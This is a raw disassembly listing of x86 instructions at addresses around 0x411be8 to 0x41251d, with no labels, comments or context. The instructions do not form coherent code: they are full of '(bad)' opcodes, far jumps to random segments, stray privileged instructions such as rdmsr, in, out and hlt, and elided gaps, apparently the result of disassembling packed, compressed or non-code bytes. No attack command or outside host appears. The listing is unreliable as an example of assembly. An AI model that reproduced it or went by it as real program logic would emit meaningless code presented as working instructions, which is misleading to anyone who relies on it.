  411be8:	jmp    0xf41f:0x5005d753
  411bef:	push   es
  411bf0:	jmp    0x67bf24ab
  411bf5:	adc    esi,esp
  411bf7:	push   es
  411bf8:	jmp    0xe5508c87
  411bfd:	add    esi,eax
  411bff:	(bad)  
  411c00:	pop    edi
  411c01:	jp     0x411bee
  411c03:	or     ch,cl
  411c05:	add    ebp,DWORD PTR [ecx-0x78]
  411c08:	clc    
  411c09:	pop    es
  411c0a:	lock push es
  411c0c:	jb     0x411b90
  411c0e:	pop    es
  411c0f:	or     ebp,ecx
  411c11:	add    edi,DWORD PTR [edx+0xf]
  411c14:	jmp    0x411c6e
  411c16:	popf   
  411c17:	inc    esi
  411c18:	pop    ss
  411c19:	sub    DWORD PTR [edx+0x21],esi
  411c1c:	out    0x8b,eax
  411c1e:	out    0xbb,eax
  411c20:	pop    edx
  411c21:	fdiv   st,st(0)
  411c23:	pop    edi
  411c24:	int3   
  411c25:	pop    es
  411c26:	lock push es
  411c28:	pushf  
  411c29:	sbb    ch,BYTE PTR [ebx-0x78]
  411c2c:	clc    
  411c2d:	pop    es
  411c2e:	lock push es
  411c30:	pusha  
  411c31:	cmp    bh,0xa
  411c34:	jmp    0x411c3c
	...
  411c45:	add    BYTE PTR [eax],al
  411c47:	add    BYTE PTR [eax-0x13e0c081],dh
  411c4d:	push   es
  411c4e:	jmp    0x588cdd
  411c53:	in     eax,dx
  411c54:	repz push es
  411c56:	mov    ebp,DWORD PTR [eax-0x25]
  411c59:	or     al,BYTE PTR [eax]
  411c5b:	jmp    0x55416461
  411c60:	(bad)  
  411c61:	jl     0x411c72
  411c63:	jmp    0x411c22
  411c65:	xor    eax,ecx
  411c67:	popa   
  411c68:	add    al,0x1e
  411c6a:	add    DWORD PTR [ecx-0x2256f8f4],ebx
  411c70:	rdmsr  
  411c72:	(bad)  
  411c73:	cmp    al,0xe5
  411c75:	jge    0x411bf7
  411c77:	fcos   
  411c79:	xor    esi,edi
  411c7b:	jo     0x411cea
  411c7d:	sbb    al,BYTE PTR [ecx+ebp*8]
  411c80:	repz (bad) 
  411c82:	mov    BYTE PTR [eax+0x8],dl
  411c85:	or     eax,DWORD PTR [eax]
  411c87:	jmp    0xed50a2f8
  411c8c:	repz push es
  411c8e:	mov    esi,DWORD PTR [eax-0x14]
  411c91:	or     al,BYTE PTR [eax]
  411c93:	jmp    0xfa003bb
  411c98:	cdq    
  411c99:	inc    edi
  411c9a:	add    ebp,ecx
  411c9c:	sahf   
  411c9d:	fimul  DWORD PTR [edx+0x5601cfcd]
  411ca3:	sbb    ch,BYTE PTR [ecx+ebx*8]
  411ca6:	or     BYTE PTR [ebx+ebp*8-0x48],0x4
  411cab:	test   BYTE PTR [eax],al
	...
  411cbd:	add    bl,ch
  411cbf:	push   es
  411cc0:	add    cl,ch
  411cc2:	jle    0x411c71
  411cc4:	and    ebx,ebp
  411cc6:	jbe    0x411d00
  411cc8:	sub    dh,BYTE PTR [ecx+ebp*2]
  411ccb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ccc:	and    ebp,ecx
  411cce:	adc    BYTE PTR gs:[edx+eax*2+0x248b11a0],al
  411cd6:	ja     0x411d33
  411cd8:	mov    WORD PTR [edx-0xc],?
  411cdb:	push   es
  411cdc:	add    BYTE PTR [eax],al
  411cde:	dec    ecx
  411cdf:	xor    ebx,DWORD PTR [eax]
  411ce1:	je     0x411d3a
  411ce3:	inc    edx
  411ce4:	inc    eax
  411ce5:	test   DWORD PTR [eax],edx
  411ce7:	js     0x411cdd
  411ce9:	or     DWORD PTR [ecx],0x6
  411cec:	test   ecx,ecx
  411cee:	xchg   esp,eax
  411cef:	add    al,BYTE PTR [ebx+0x1e01bc0]
  411cf5:	sbb    DWORD PTR [ecx+0x4],0x47
  411cf9:	inc    esi
  411cfa:	mov    ch,BYTE PTR [ecx+0x22]
  411cfd:	sbb    al,0x8
  411cff:	jbe    0x411ccd
  411d01:	pop    edi
  411d02:	out    dx,eax
  411d03:	dec    edi
  411d04:	pop    ecx
  411d05:	ret    0x50d
  411d08:	mov    edx,DWORD PTR [ebp+esi*8+0x6]
  411d0c:	push   ebp
  411d0d:	push   esi
  411d0e:	cmp    dl,0xc5
  411d11:	xchg   cl,al
  411d13:	xor    dh,bh
  411d15:	(bad)  
  411d16:	fld    DWORD PTR [eax+eax*1]
  411d19:	add    BYTE PTR [ebx+0x2],dl
  411d1c:	test   cl,cl
  411d1e:	fidiv  WORD PTR [eax+0x12e]
	...
  411d34:	fld    DWORD PTR [edi+edx*2]
  411d37:	mov    edi,DWORD PTR [ebp+0x4e831250]
  411d3d:	std    
  411d3e:	jne    0x411d45
  411d40:	mov    ?,ebp
  411d42:	(bad)  
  411d43:	call   FWORD PTR [ecx-0x29d43f7f]
  411d49:	xchg   ebx,eax
  411d4a:	cmp    BYTE PTR [eax],cl
  411d4c:	lds    eax,FWORD PTR [edx+0x4d]
  411d4f:	inc    eax
  411d50:	add    al,0xed
  411d52:	jae    0x411d4a
  411d54:	sbb    al,BYTE PTR [esi+0x499041a]
  411d5a:	push   DWORD PTR [ebp-0x54]
  411d5d:	add    DWORD PTR [eax+edx*1-0x76fffb7b],0x40bd7
  411d68:	lock sbb eax,0x2276c6c2
  411d6e:	(bad)  
  411d6f:	call   DWORD PTR [edi+0x36]
  411d72:	add    al,BYTE PTR [eax]
  411d74:	lock mov dh,0x80
  411d77:	paddsb mm3,QWORD PTR ds:0x56768b02
  411d7e:	(bad)  
  411d7f:	push   DWORD PTR [edi]
  411d81:	outs   dx,BYTE PTR ds:[esi]
  411d82:	jecxz  0x411d0e
  411d84:	jbe    0x411db4
  411d86:	(bad)  
  411d87:	jmp    DWORD PTR [edi]
  411d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d8a:	or     eax,0x3726685f
  411d8f:	test   DWORD PTR [eax],eax
  411d91:	and    al,BYTE PTR [edx]
  411d93:	add    BYTE PTR [esi+0x74612],ch
	...
  411da9:	add    al,dh
  411dab:	mov    ds:0x9d387338,al
  411db0:	dec    edx
  411db1:	(bad)  
  411db2:	icebp  
  411db3:	mov    bh,0x17
  411db5:	add    al,0xf0
  411db7:	sbb    eax,0x12f96885
  411dbc:	sbb    ecx,DWORD PTR [ebx-0x1d28a]
  411dc2:	xlat   BYTE PTR ds:[ebx]
  411dc3:	mov    dh,0x81
  411dc5:	pop    ss
  411dc6:	hlt    
  411dc7:	sbb    eax,0xc7794002
  411dcc:	pop    ss
  411dcd:	add    al,0xf0
  411dcf:	sbb    eax,0x21e08589
  411dd4:	add    al,BYTE PTR [eax]
  411dd6:	jnp    0x411d7f
  411dd8:	sbb    eax,DWORD PTR [eax+esi*8]
  411ddb:	sbb    eax,0xebf20f8c
  411de0:	cmp    ecx,eax
  411de2:	push   0xec8e014d
  411de7:	sub    DWORD PTR [edx],eax
  411de9:	add    ch,bh
  411deb:	push   esi
  411dec:	mov    eax,DWORD PTR [ebp+0x229e0]
  411df2:	imul   eax,DWORD PTR [esi],0x6f41c6f
  411df8:	jmp    0xf4a196c0
  411dfd:	call   FWORD PTR [edi+0x2f]
  411e00:	pop    edi
  411e01:	and    bh,0xa
  411e04:	jmp    0xe0c9990c
  411e09:	inc    DWORD PTR [edi+0x2f]
  411e0c:	bound  edx,QWORD PTR [eax+eax*1]
	...
  411e1f:	add    dl,dh
  411e21:	push   esp
  411e22:	out    dx,al
  411e23:	inc    ebp
  411e24:	outs   dx,DWORD PTR ds:[esi]
  411e25:	push   ss
  411e26:	call   0xe94c29b4
  411e2b:	add    ebx,DWORD PTR [ebp-0x107e9df3]
  411e31:	or     ch,cl
  411e33:	add    ebp,DWORD PTR [ecx-0x78]
  411e36:	loopne 0x411e37
  411e38:	comiss xmm5,DWORD PTR [eax]
  411e3b:	mov    edx,DWORD PTR [ebp+0x12]
  411e3e:	in     eax,dx
  411e3f:	add    esi,eax
  411e41:	jge    0x411ea9
  411e43:	adc    ebp,esp
  411e45:	push   es
  411e46:	jmp    0xe55093d7
  411e4b:	add    esi,eax
  411e4d:	and    al,0x5
  411e50:	test   eax,0xbe8ca72d
  411e55:	jmp    0x4971:0xd8f78b9b
  411e5c:	iret   
  411e5d:	push   eax
  411e5e:	je     0x411e98
  411e60:	mov    esi,0x9784a582
  411e65:	add    edi,DWORD PTR [ecx+0x2c1fbd8c]
  411e6b:	aaa    
  411e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6d:	cs popa 
  411e6f:	dec    eax
  411e70:	jb     0x411e9a
  411e72:	jmp    0x8b78:0x503d6ad2
  411e79:	cs cmp eax,0x88e84
  411e7f:	sahf   
  411e80:	ins    BYTE PTR es:[edi],dx
  411e81:	cmp    al,0xe7
  411e83:	jne    0x411e85
	...
  411e95:	add    BYTE PTR [edi+0x49c6fe2c],bh
  411e9b:	retf   
  411e9c:	shl    ecx,0xf3
  411e9f:	mov    eax,ecx
  411ea1:	push   ss
  411ea2:	bnd jl 0x411ec0
  411ea5:	in     eax,0xf3
  411ea7:	push   es
  411ea8:	lea    edx,[eax+0x7218b3fa]
  411eae:	jno    0x411eae
  411eb0:	add    ebp,ecx
  411eb2:	repz jg 0x411e3a
  411eb5:	shl    DWORD PTR [edi],1
  411eb7:	cs (bad) 
  411eb9:	sub    DWORD PTR [ebp+0x5c],edi
  411ebc:	sbb    esp,ebp
  411ebe:	repz push es
  411ec0:	mov    DWORD PTR [edi+0x4],ebp
  411ec3:	add    eax,DWORD PTR [eax]
  411ec5:	jmp    0xed58a334
  411eca:	repz push es
  411ecc:	mov    bl,cl
  411ece:	icebp  
  411ecf:	pop    eax
  411ed0:	std    
  411ed1:	stos   DWORD PTR es:[edi],eax
  411ed2:	ins    BYTE PTR es:[edi],dx
  411ed3:	inc    BYTE PTR [eax]
  411ed5:	pop    edi
  411ed6:	fadd   DWORD PTR [edx]
  411ed8:	add    cl,ch
  411eda:	mov    al,ds:0xfc678b0e
  411edf:	add    al,BYTE PTR [eax]
  411ee1:	jmp    0xe558a252
  411ee6:	repz push es
  411ee8:	inc    eax
  411ee9:	jo     0x411f41
  411eeb:	adc    al,BYTE PTR [ecx+ebp*8]
  411eee:	repz jg 0x411e76
  411ef1:	fnstcw WORD PTR [edi+0x3662fe2d]
  411ef7:	push   ss
  411ef8:	add    al,0xe9
	...
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	repz or BYTE PTR [edi],0xeb
  411f10:	inc    ecx
  411f11:	sub    al,0xc1
  411f13:	popa   
  411f14:	add    al,0x8
  411f16:	mov    gs,ebp
  411f18:	xchg   edi,eax
  411f19:	sub    eax,0xa4c00fe
  411f1e:	mov    eax,DWORD PTR [esi-0x1d257]
  411f24:	adc    BYTE PTR [ebp+0x9890416],ch
  411f2a:	inc    eax
  411f2b:	mov    edi,eax
  411f2d:	push   cs
  411f2e:	add    al,0x0
  411f30:	pop    ecx
  411f31:	jp     0x411eb7
  411f33:	adc    BYTE PTR [ebp+0x9],cl
  411f36:	add    BYTE PTR [ebx+0x40acf],cl
  411f3c:	pop    ecx
  411f3d:	jg     0x411f4d
  411f3f:	add    ch,bl
  411f41:	hlt    
  411f42:	ror    BYTE PTR [eax+0x1c8e0219],0x4d
  411f49:	or     DWORD PTR [eax],eax
  411f4b:	jne    0x411f3d
  411f4d:	add    DWORD PTR [eax+edx*1-0x76fff6f3],0x4118f
  411f58:	or     DWORD PTR [ecx-0x79],ecx
  411f5b:	scas   al,BYTE PTR es:[edi]
  411f5c:	adc    eax,0x80fffe2d
  411f61:	stos   DWORD PTR es:[edi],eax
  411f62:	push   cs
  411f63:	add    al,0x9
  411f65:	or     DWORD PTR [ebx-0x1d2de7a],ecx
  411f6b:	jmp    FWORD PTR [ecx+0x8dff28]
	...
  411f81:	add    ch,ah
  411f83:	sub    al,0xfe
  411f85:	(bad)  
  411f86:	cld    
  411f87:	or     DWORD PTR [ebx-0x1d3267a],ecx
  411f8d:	inc    DWORD PTR [eax-0x56]
  411f90:	push   ss
  411f91:	add    al,0xd9
  411f93:	or     BYTE PTR [eax-0x77],al
  411f96:	aaa    
  411f97:	adc    al,0x4
  411f99:	add    cl,cl
  411f9b:	jnp    0x411f21
  411f9d:	adc    BYTE PTR [ebp+0xf8b0008],bl
  411fa3:	adc    BYTE PTR [eax+eax*1],al
  411fa6:	lock sbb eax,0xcbf11f52
  411fac:	push   ss
  411fad:	add    al,0xf0
  411faf:	sbb    eax,0xa47b18af
  411fb4:	adc    al,BYTE PTR [eax+esi*8]
  411fb7:	sbb    eax,0x21d8858b
  411fbc:	add    al,BYTE PTR [eax]
  411fbe:	mov    al,0xb6
  411fc0:	fs sbb ebp,esp
  411fc3:	sbb    eax,0x2e768902
  411fc8:	(bad)  
  411fc9:	call   DWORD PTR [edi-0x57]
  411fcc:	jl     0x411fe5
  411fce:	hlt    
  411fcf:	sbb    eax,0x1f10d002
  411fd4:	test   BYTE PTR [ebx],bl
  411fd6:	hlt    
  411fd7:	sbb    eax,0xa8d97502
  411fdc:	jl     0x411fed
  411fde:	hlt    
  411fdf:	sbb    eax,0x66e8902
	...
  411ff8:	lock fisttp QWORD PTR [edx+0x221f4ad]
  411fff:	add    BYTE PTR [ecx-0x64],bh
  412002:	adc    eax,DWORD PTR [eax+esi*8]
  412005:	sbb    eax,0x19d8b587
  41200a:	add    al,BYTE PTR [eax]
  41200c:	and    BYTE PTR [esi+edx*8],al
  41200f:	pop    esp
  412010:	mov    dl,0x35
  412012:	add    cl,BYTE PTR [ebx+0x55fe422c]
  412018:	inc    edi
  412019:	test   eax,0xa90023b7
  41201e:	xor    bh,BYTE PTR [eax+esi*2]
  412021:	sbb    eax,0x4a430002
  412026:	jg     0x412026
  412028:	hlt    
  412029:	xor    BYTE PTR [ebx],cl
  41202b:	cmp    ebp,DWORD PTR [esi+0x41]
  41202e:	(bad)  
  41202f:	jmp    FWORD PTR [edi-0x613022fa]
  412035:	dec    esi
  412036:	add    DWORD PTR [edx+esi*2+0x26],eax
  41203a:	out    dx,al
  41203b:	aam    0x72
  41203d:	inc    esi
  41203e:	jecxz  0x412015
  412040:	mov    cl,0xfe
  412042:	call   0xe5238e3f
  412047:	add    esi,eax
  412049:	mov    dl,0xf3
  41204b:	div    bh
  41204d:	push   es
  41204e:	jmp    0x6a430356
  412053:	and    eax,0xf6f81ff1
  412058:	pop    edi
  412059:	add    ch,cl
  41205b:	add    eax,DWORD PTR [eax]
	...
  41206d:	add    dl,ah
  41206f:	add    eax,0xaa4ff69e
  412074:	call   0xae46e27c
  412079:	inc    edx
  41207a:	push   edi
  41207b:	(bad)  
  41207c:	cdq    
  41207d:	xor    BYTE PTR [edi+0x7],0x99
  412081:	sub    edx,ebp
  412083:	xor    ch,ah
  412085:	xor    al,0xbe
  412087:	jg     0x412037
  412089:	mov    BYTE PTR [edi+0x1e],al
  41208c:	hlt    
  41208d:	cmp    DWORD PTR [esi],edx
  41208f:	sub    ebx,DWORD PTR [ebx-0x41]
  412092:	out    0x0,eax
  412094:	and    dl,ch
  412096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412097:	dec    eax
  412098:	lock add esp,DWORD PTR [edi-0x9c61be2]
  41209f:	sub    cl,BYTE PTR ds:0x4703af81
  4120a5:	inc    edx
  4120a6:	out    dx,eax
  4120a7:	push   es
  4120a8:	cmp    cl,BYTE PTR [ecx-0x311f1cc5]
  4120ae:	cmp    eax,0x8d80977e
  4120b3:	fucomip st,st(4)
  4120b5:	add    esi,eax
  4120b7:	push   es
  4120b8:	push   ss
  4120b9:	add    eax,0xe8000e74
  4120be:	repz push es
  4120c0:	xor    DWORD PTR [edx+0x73],0x60e9fe2a
  4120c7:	mov    DWORD PTR [edx+0x412bfdd],0x362299da
  4120d1:	push   edx
	...
  4120e2:	add    BYTE PTR [eax],al
  4120e4:	les    ebp,FWORD PTR [eax]
  4120e6:	mov    dh,BYTE PTR [edi]
  4120e8:	fcmovnu st,st(1)
  4120ea:	cli    
  4120eb:	les    edi,FWORD PTR ds:[ebp+ecx*8+0x41]
  4120f0:	mov    ecx,0x792efe2f
  4120f5:	(bad)  
  4120f6:	and    eax,DWORD PTR [ecx]
  4120f8:	jns    0x41208e
  4120fa:	pmulhw mm6,mm3
  4120fd:	push   es
  4120fe:	mov    ah,BYTE PTR [edx]
  412100:	aaa    
  412101:	pop    es
  412102:	add    ah,BYTE PTR [eax]
  412104:	icebp  
  412105:	inc    edi
  412106:	pop    esi
  412107:	jno    0x4120fa
  412109:	sub    DWORD PTR [ebp-0x1d5c027],eax
  41210f:	pusha  
  412110:	pop    ebp
  412111:	out    0x3,al
  412113:	jmp    0x429dea0b
  412118:	scas   al,BYTE PTR es:[edi]
  412119:	add    DWORD PTR [eax],eax
  41211b:	push   0xffffffb3
  41211d:	sub    BYTE PTR [eax],al
  41211f:	xchg   edi,eax
  412120:	add    BYTE PTR [ebx],al
  412122:	add    cl,ch
  412124:	jo     0x4120bf
  412126:	or     BYTE PTR [esi*8-0x8267a83],bh
  41212d:	push   es
  41212e:	add    BYTE PTR [eax+0x6a],ah
  412131:	adc    al,BYTE PTR [ecx+ebp*8]
  412134:	repz (bad) 
  412136:	mov    BYTE PTR [edi+0x0],dl
  412139:	add    eax,DWORD PTR [eax]
  41213b:	jmp    0xed50a59c
  412140:	repz push es
  412142:	mov    esp,DWORD PTR [edi-0x4]
  412145:	add    al,BYTE PTR [eax]
	...
  412157:	add    BYTE PTR [eax],al
  412159:	add    cl,bl
  41215b:	stos   DWORD PTR es:[edi],eax
  41215c:	push   es
  41215d:	add    al,BYTE PTR [eax-0x2e77400c]
  412163:	add    bh,BYTE PTR [esi+0x5951c]
  412169:	jne    0x41215b
  41216b:	test   eax,0x5951084
  412170:	add    BYTE PTR [ecx+0x3fb07],cl
  412176:	cdq    
  412177:	inc    ebp
  412178:	xchg   DWORD PTR [esi+0x18d],ebp
  41217e:	add    BYTE PTR [ebp+0xe],bh
  412181:	add    al,0x89
  412183:	add    eax,0x141868b
  412188:	add    BYTE PTR [eax],al
  41218a:	sub    DWORD PTR [ebx],esp
  41218c:	mov    ebx,edx
  41218e:	or     BYTE PTR [ecx],cl
  412190:	pop    es
  412191:	or     DWORD PTR [ebx],0x1
  412194:	push   edx
  412195:	mov    ebp,edi
  412197:	or     cl,al
  412199:	cli    
  41219a:	out    dx,al
  41219b:	cmc    
  41219c:	mov    DWORD PTR [esi+0x119],eax
  4121a2:	sar    edx,1
  4121a4:	mov    bh,0x1
  4121a6:	sbb    DWORD PTR ds:0x15970100,eax
  4121ac:	add    al,0x0
  4121ae:	or     DWORD PTR [edx+0x505249c],ebp
  4121b4:	add    BYTE PTR [ecx-0x17ade],al
  4121ba:	sbb    DWORD PTR [eax+0x16],esi
  4121bd:	add    DWORD PTR [eax],0x0
	...
  4121d0:	lods   eax,DWORD PTR ds:[esi]
  4121d1:	push   ds
  4121d2:	push   ss
  4121d3:	add    dl,BYTE PTR [edx+0x8182269]
  4121d9:	test   al,0xcc
  4121db:	call   0x3efc46
  4121e0:	push   ds
  4121e1:	push   ebp
  4121e2:	pop    ebx
  4121e3:	pop    ebx
  4121e4:	lock pop ebx
  4121e6:	cli    
  4121e7:	push   DWORD PTR [eax-0x6b]
  4121ea:	add    al,BYTE PTR ds:0x3b41df0
  4121f0:	or     edx,esp
  4121f2:	out    0x17,eax
  4121f4:	jno    0x4121ab
  4121f6:	add    bh,BYTE PTR [ebp-0x10]
  4121f9:	sbb    eax,0x59d903b4
  4121fe:	out    0x17,al
  412200:	imul   ebx,DWORD PTR [edx-0x1a],0x17
  412204:	inc    ecx
  412205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412206:	inc    eax
  412207:	out    0x1c,eax
  412209:	aam    0x31
  41220b:	(bad)  
  41220c:	daa    
  41220d:	pusha  
  41220e:	iret   
  41220f:	pop    edx
  412210:	mov    dl,0x36
  412212:	add    al,bh
  412214:	outs   dx,BYTE PTR ds:[esi]
  412215:	push   es
  412216:	or     BYTE PTR [eax],al
  412218:	lock push ds
  41221a:	add    al,BYTE PTR [eax]
  41221c:	lock sahf 
  41221e:	sub    eax,0x21df07f
  412223:	jae    0x4121ce
  412225:	pushf  
  412226:	scas   al,BYTE PTR es:[edi]
  412227:	and    ebp,eax
  412229:	and    DWORD PTR [ebp-0x195ff4bf],esi
  41222f:	add    esi,eax
  412231:	sbb    eax,0x39b6
	...
  412246:	dec    eax
  412247:	and    al,0x2c
  412249:	(bad)  
  41224a:	das    
  41224b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41224c:	inc    eax
  41224d:	out    0xf3,eax
  41224f:	and    esi,DWORD PTR [eax]
  412251:	(bad)  
  412252:	imul   ebx,DWORD PTR [eax+0x1b],0xffffffcc
  412256:	sbb    DWORD PTR [ecx+0x30],edx
  412259:	mov    DWORD PTR [ecx+eax*1+0x4e768b0c],esi
  412260:	push   es
  412261:	add    al,dh
  412263:	mov    bl,0x54
  412265:	and    esi,ecx
  412267:	sbb    edx,DWORD PTR [ecx+eax*1-0x4e]
  41226b:	clc    
  41226c:	jnp    0x41226e
  41226e:	out    0x6,eax
  412270:	outs   dx,DWORD PTR ds:[esi]
  412271:	adc    al,0xf4
  412273:	push   es
  412274:	jmp    0xed2397f3
  412279:	add    esi,eax
  41227b:	enter  0xcd2b,0xb1
  41227f:	(bad)  
  412280:	call   0xe768d109
  412285:	jno    0x412262
  412287:	add    ch,cl
  412289:	add    edi,DWORD PTR [ebp-0x69]
  41228c:	fbstp  TBYTE PTR [esi+0x146e7c08]
  412292:	hlt    
  412293:	push   es
  412294:	jmp    0xed4f9013
  412299:	add    esi,eax
  41229b:	(bad)  
  41229c:	pop    edi
  41229d:	(bad)  
  41229e:	jmp    0x4122a2
  4122a0:	jmp    0xd8c18ba8
  4122a5:	pop    es
  4122a6:	lock push es
  4122a8:	bound  ecx,QWORD PTR [edx+0x0]
	...
  4122ba:	add    BYTE PTR [eax],al
  4122bc:	pop    es
  4122bd:	add    ebp,ecx
  4122bf:	add    edi,DWORD PTR [edx+0x16]
  4122c2:	jmp    0x412319
  4122c4:	pop    ebp
  4122c5:	inc    esp
  4122c6:	jo     0x4122dc
  4122c8:	icebp  
  4122c9:	push   0x6f007f4
  4122ce:	xchg   esp,eax
  4122cf:	or     bh,BYTE PTR [ebx-0x80]
  4122d2:	fadd   DWORD PTR [edi]
  4122d4:	lock push es
  4122d6:	jo     0x412262
  4122d8:	fild   WORD PTR [edx]
  4122da:	jmp    0x3ebed2e2
  4122df:	adc    ah,ch
  4122e1:	push   es
  4122e2:	jmp    0xe5579861
  4122e7:	add    esi,eax
  4122e9:	jnp    0x412359
  4122eb:	or     esi,esp
  4122ed:	push   es
  4122ee:	jmp    0x672d0a46
  4122f3:	out    0xf3,eax
  4122f5:	push   es
  4122f6:	jmp    0xffbca4b2
  4122fb:	test   eax,0x6a072e32
  412300:	xor    ecx,DWORD PTR [ecx]
  412302:	push   eax
  412303:	xchg   ecx,eax
  412304:	jns    0x412325
  412306:	(bad)  
  412307:	sahf   
  412308:	push   esp
  412309:	xchg   esp,eax
  41230a:	paddsw mm6,mm3
  41230d:	push   es
  41230e:	mov    al,dh
  412310:	pop    ebx
  412311:	pop    es
  412312:	add    cl,ch
  412314:	repz pop es
  412316:	xchg   cl,bl
  412318:	out    dx,eax
  412319:	push   es
  41231a:	add    BYTE PTR [eax-0x7f],ah
  41231d:	jmp    0x0:0xe903
	...
  412330:	add    BYTE PTR [eax],al
  412332:	repz xchg edx,edi
  412335:	imul   esi,ebx,0xebda0006
  41233b:	mov    DWORD PTR [ebx+0xd],ebp
  41233e:	cld    
  41233f:	or     BYTE PTR [ebx+0x51fe8fb5],cl
  412345:	jb     0x412378
  412347:	arpl   WORD PTR cs:[eax-0x40],ax
  41234b:	and    al,0x5e
  41234d:	xchg   edi,eax
  41234e:	ds rol ecx,0xe1
  412352:	repz xchg edx,edi
  412355:	jmp    0x9b412a50
  41235a:	out    dx,eax
  41235b:	out    dx,eax
  41235c:	inc    ebx
  41235d:	int    0xfb
  41235f:	xchg   edx,edi
  412361:	jmp    0x7c3f49fc
  412366:	pop    edx
  412367:	out    dx,eax
  412368:	inc    ebx
  412369:	(bad)
  41236c:	push   ebx
  41236d:	int    0xfb
  41236f:	mov    eax,0xdf0b1f8a
  412374:	clc    
  412375:	out    0xcf,al
  412377:	les    ebx,FWORD PTR [ebp+0x3c]
  41237a:	sub    ecx,DWORD PTR [eax+0x7]
  41237d:	jmp    0xe55c8876
  412382:	repz push es
  412384:	jne    0x412386
  412386:	adc    BYTE PTR [ecx+0xa0d1084],ah
  41238c:	add    BYTE PTR [ecx+0x4135f],cl
  412392:	(bad)  [ecx-0x79]
  412395:	scas   al,BYTE PTR es:[edi]
	...
  4123a6:	add    BYTE PTR [eax],al
  4123a8:	cmc    
  4123a9:	push   cs
  4123aa:	add    BYTE PTR [eax],al
  4123ac:	pusha  
  4123ad:	lea    ecx,[esi]
  4123af:	add    al,0xd9
  4123b1:	or     DWORD PTR [ebx+0xdc186],ecx
  4123b7:	add    BYTE PTR [ecx+0x2a],bl
  4123ba:	(bad)  
  4123bb:	mov    ebp,0xd95
  4123c0:	lods   al,BYTE PTR ds:[esi]
  4123c1:	adc    cl,BYTE PTR [ebx+0xdc986]
  4123c7:	add    BYTE PTR [eax],ah
  4123c9:	lea    edx,[esi]
  4123cb:	add    al,0x89
  4123cd:	or     DWORD PTR [eax-0x77],eax
  4123d0:	ja     0x4123c8
  4123d2:	add    eax,DWORD PTR [eax]
  4123d4:	cdq    
  4123d5:	mov    ds:0x98d1084,al
  4123da:	add    BYTE PTR [ebx+0x4130f],cl
  4123e0:	pop    ecx
  4123e1:	mov    ecx,0x2d7d8b1e
  4123e6:	push   ss
  4123e7:	push   edx
  4123e8:	loop   0x4123ce
  4123ea:	out    0xd4,al
  4123ec:	adc    esi,esi
  4123ee:	std    
  4123ef:	pop    edi
  4123f0:	xchg   DWORD PTR [esi],esi
  4123f2:	pop    ecx
  4123f3:	ret    0x951
  4123f6:	mov    eax,DWORD PTR [ebp+ebp*1+0xd]
  4123fa:	lea    edx,[eax-0x7eb7]
  412400:	bound  edi,QWORD PTR [edx+0x2]
  412403:	add    al,0x19
  412405:	or     DWORD PTR [esi+0x19],esi
  412408:	mov    ds:0x40aa2,al
	...
  41241d:	add    BYTE PTR [ecx],cl
  41241f:	or     DWORD PTR [ebx],edi
  412421:	shl    eax,0xc5
  412424:	or     BYTE PTR [ebx],ch
  412426:	xor    DWORD PTR [ecx+0x6],esi
  412429:	add    bl,cl
  41242b:	outs   dx,BYTE PTR ds:[esi]
  41242c:	pop    es
  41242d:	add    BYTE PTR [eax-0xb3dfdd2],cl
  412433:	sub    eax,0x2ab2bff1
  412438:	add    al,BYTE PTR [ebx+0x54d11ecc]
  41243e:	imul   edx,DWORD PTR [edx],0xffffffe8
  412441:	pop    ds
  412442:	es inc ecx
  412444:	dec    ecx
  412445:	mov    al,cl
  412447:	fnstsw WORD PTR [ebx+ebx*2+0x14]
  41244b:	ds jnp 0x4124a9
  41244e:	or     al,0x26
  412450:	jmp    0x4123ff
  412452:	clc    
  412453:	xor    DWORD PTR [edx],eax
  412455:	add    bh,dh
  412457:	mov    al,0x61
  412459:	call   FWORD PTR [edi+0x650a192e]
  41245f:	mov    ah,dh
  412461:	dec    DWORD PTR [edi+0xc8d022e]
  412467:	or     al,BYTE PTR [ebx+ecx*4]
  41246a:	jbe    0x41249e
  41246c:	push   es
  41246d:	add    al,dh
  41246f:	mov    dl,0x7a
  412471:	call   edi
  412473:	add    bh,BYTE PTR cs:[ebx]
  412476:	cmp    BYTE PTR [ebp+edx*1-0x75],bl
  41247a:	outs   dx,BYTE PTR ds:[esi]
  41247b:	sbb    al,BYTE PTR [esi]
  41247d:	add    al,dh
  41247f:	sub    BYTE PTR [ebx+0x75],al
	...
  412492:	add    BYTE PTR [eax],al
  412494:	hlt    
  412495:	dec    eax
  412496:	inc    ebx
  412497:	jmp    0x75f0:0x44348fb
  41249e:	add    eax,DWORD PTR [eax]
  4124a0:	dec    ebx
  4124a1:	xor    cl,dh
  4124a3:	mov    edi,0x3faac7b
  4124a8:	lock sub eax,0x701b5fd
  4124ae:	div    BYTE PTR [ebp-0x58]
  4124b1:	add    eax,0xb65d872
  4124b6:	bound  eax,QWORD PTR [eax]
  4124b8:	jp     0x41244a
  4124ba:	push   cs
  4124bb:	jnp    0x4124a8
  4124bd:	mov    esi,DWORD PTR [ecx-0x7a]
  4124c0:	out    dx,eax
  4124c1:	or     ch,cl
  4124c3:	add    edi,edi
  4124c5:	pop    esp
  4124c6:	fdivr  st,st(4)
  4124c8:	popf   
  4124c9:	(bad)  
  4124ca:	out    0x78,eax
  4124cc:	sub    edi,DWORD PTR [ebp-0x14]
  4124cf:	js     0x41254e
  4124d1:	or     ah,ch
  4124d3:	add    esi,eax
  4124d5:	(bad)  
  4124d6:	cld    
  4124d7:	or     BYTE PTR [eax-0xffc16fb],0x5
  4124de:	ja     0x4124e8
  4124e0:	in     al,dx
  4124e1:	push   es
  4124e2:	jmp    0xed4fa2e9
  4124e7:	add    esi,eax
  4124e9:	(bad)  
  4124ea:	data16 or ah,dh
  4124ed:	push   es
  4124ee:	jmp    0x6f30d46b
  4124f3:	add    ah,dh
  4124f5:	push   es
  4124f6:	jmp    0x41257d
	...
  412507:	add    BYTE PTR [eax],al
  412509:	add    BYTE PTR [eax-0xffd3efa],cl
  41250f:	pushf  
  412510:	in     eax,dx
  412511:	mov    ebx,0x7ec8c68
  412516:	lock push es
  412518:	lock pop ebp
  41251a:	out    dx,eax
  41251b:	or     ch,cl
  41251d:	add    ebp,edi
